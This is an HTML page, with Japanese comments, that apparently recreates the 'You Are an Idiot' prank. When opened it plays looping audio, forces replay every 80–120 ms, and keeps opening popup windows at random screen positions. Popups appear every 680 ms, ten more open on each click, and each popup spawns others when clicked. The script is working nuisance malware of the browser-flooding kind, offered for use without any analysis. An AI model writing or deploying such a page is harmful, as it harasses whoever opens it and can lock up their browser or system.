<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>YOU ARE AN IDIOT</title>
    <style>
        body {
            margin: 0; padding: 0; background: black; color: lime;
            font-family: sans-serif; text-align: center; overflow: hidden;
        }
        h1 {
            font-size: 3.8em;
            margin: 8vh 0 10px;
            text-shadow: 0 0 25px lime;
            animation: blink 0.3s infinite alternate;
        }
        @keyframes blink { from { opacity: 0.5; } to { opacity: 1; } }
        .idiot-img {
            max-width: 92vw;
            max-height: 68vh;
            width: auto;
            height: auto;
            margin: 10px auto;
            display: block;
            border: 8px solid lime;
            box-shadow: 0 0 40px lime;
        }
        p { font-size: 1.7em; margin: 15px; color: #ff0; }
    </style>
</head>
<body>
    <h1>YOU ARE AN IDIOT</h1>
    <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
         class="idiot-img" alt="You are an idiot">
    <p>開いたら勝手に音が鳴り続けるはず...<br>（まだ鳴らない場合は1回クリックして！）</p>

    <audio id="idiotSound" preload="auto" loop>
        <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
    </audio>

    <script>
        const sound = document.getElementById('idiotSound');
        let count = 1;

        function forcePlay(audio) {
            if (!audio) return;
            audio.currentTime = 0;
            audio.play().catch(() => {
                // 失敗したら即再挑戦（超強引）
                setTimeout(() => forcePlay(audio), 80);
            });
        }

        function spawnPopup() {
            const width = 470;
            const height = 430;
            const left = Math.random() * (screen.availWidth - width - 180) + 90;
            const top = Math.random() * (screen.availHeight - height - 180) + 90;

            const popup = window.open('', '_blank', 
                `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
            );

            if (popup) {
                popup.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <meta charset="UTF-8">
                        <title>YOU ARE AN IDIOT ×${count}</title>
                        <style>
                            body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
                            h1 { font-size:2.9em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.4s infinite alternate; }
                            .idiot-img { max-width:92vw; max-height:68vh; width:auto; height:auto; margin:10px auto; display:block; border:7px solid lime; box-shadow:0 0 35px lime; }
                            @keyframes blink { from { opacity: 0.6; } to { opacity: 1; } }
                        </style>
                    </head>
                    <body>
                        <h1>YOU ARE AN IDIOT</h1>
                        <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
                        <p>音が勝手に鳴ってるはず...</p>
                        <audio id="sound" preload="auto" loop>
                            <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
                        </audio>
                        <script>
                            const s = document.getElementById('sound');
                            function forcePlay() {
                                s.currentTime = 0;
                                s.play().catch(() => setTimeout(forcePlay, 80));
                            }

                            // ポップアップ開いた瞬間に超強引再生
                            window.onload = function() {
                                forcePlay();
                                setTimeout(forcePlay, 50);
                                setTimeout(forcePlay, 120);
                                setTimeout(forcePlay, 250);

                                // 100msごとに死ぬほど粘る保険
                                setInterval(() => {
                                    if (s.paused || s.ended) forcePlay();
                                }, 100);
                            };

                            document.addEventListener('click', () => {
                                forcePlay();
                                if (window.opener && typeof window.opener.spawnPopup === 'function') window.opener.spawnPopup();
                            });
                        <\/script>
                    </body>
                    </html>
                `);
                popup.document.close();
                count++;
            }
        }

        // ====================== メイン画面 ======================
        window.onload = () => {
            function mainForcePlay() {
                sound.currentTime = 0;
                sound.play().catch(() => setTimeout(mainForcePlay, 80));
            }

            // メインも超強引
            mainForcePlay();
            setTimeout(mainForcePlay, 50);
            setTimeout(mainForcePlay, 150);
            setTimeout(mainForcePlay, 300);

            // 開いた直後にポップアップ連発
            setTimeout(() => spawnPopup(), 400);
            setTimeout(() => spawnPopup(), 750);
            setTimeout(() => spawnPopup(), 1200);

            // 自動増殖
            setTimeout(() => {
                setInterval(spawnPopup, 680);
            }, 2000);

            // クリックで10個
            document.addEventListener('click', () => {
                mainForcePlay();
                for (let i = 0; i < 10; i++) {
                    setTimeout(spawnPopup, i * 30);
                }
            });

            // 最終保険
            setInterval(() => {
                if (sound.paused) mainForcePlay();
            }, 120);
        };
    </script>
</body>
</html>
